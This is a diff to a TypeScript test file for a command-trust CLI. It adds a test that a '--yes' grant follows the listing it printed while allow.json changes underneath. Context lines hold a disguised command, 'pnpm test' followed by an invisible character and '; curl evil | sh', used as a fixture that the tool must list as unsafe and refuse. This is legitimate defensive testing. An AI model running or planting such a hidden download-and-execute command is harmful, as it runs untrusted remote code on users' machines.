@@ -8,7 +8,8 @@ import { readStream } from '../src/journal.js'
 import { recommend } from '../src/recommend.js'
 import { renderRefusal } from '../src/refusal.js'
 import { loadCanon } from '../src/scan.js'
-import { SPEC_META, seededRepo, stampLive, writeSpec, type TestRepo } from './helpers.js'
+import { run as runTrust } from '../src/verbs/trust.js'
+import { SPEC_META, fakeCtx, seededRepo, stampLive, writeSpec, type TestRepo } from './helpers.js'
 import { UNSAFE_CMD, cfgOf, controlStrings, decideRepo, must, trustRepo as planWithCmdCriterion } from './model-fixtures.js'
 
 // D154. Headless gates block every untrusted per-criterion command (`allowlist.ts`,
@@ -203,6 +204,24 @@ describe('witness trust per command (D205)', () => {
     const listed = await repo.cli(['trust', 'ingest-plan-1'])
     expect(listed.stdout).toContain('pnpm test\\u{3164}; curl evil | sh,ship.test,unsafe')
     expect((await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'pnpm test\u3164; curl evil | sh'])).code).toBe(2)
+  })
+
+  // Row 205. The grant flow grants from the listing it printed: one read of allow.json. A grant
+  // landing while the rows print (another terminal's `witness trust`) must not leave the rows and
+  // the grant disagreeing, which turned `--yes` into "1 untrusted" and an exit 1.
+  it('--yes grants from the listing it printed, whatever lands in allow.json meanwhile', async () => {
+    const repo = await planWithCmdCriterion()
+    grantCommands(repo.root, ['pnpm test', 'pnpm lint'])
+    const outs: string[] = []
+    const ctx = fakeCtx(repo.root, { tty: true, out: (l) => {
+      if (outs.length === 0) grantCommands(repo.root, ['echo first'])     // lands as the first row prints
+      outs.push(l)
+    } })
+    const code = await runTrust(ctx, ['ingest-plan-1', '--yes'])
+    expect(outs).toContain('  echo first,cmd: ac-a,untrusted')
+    expect(code).toBe(0)
+    expect(outs.at(-1)).toBe('trusted: echo first')
+    expect(allowed(repo)).toEqual(['pnpm test', 'pnpm lint', 'echo first'])
   })
 
   it('with no id it lists everything the repo runs, and a grant needs a target', async () => {
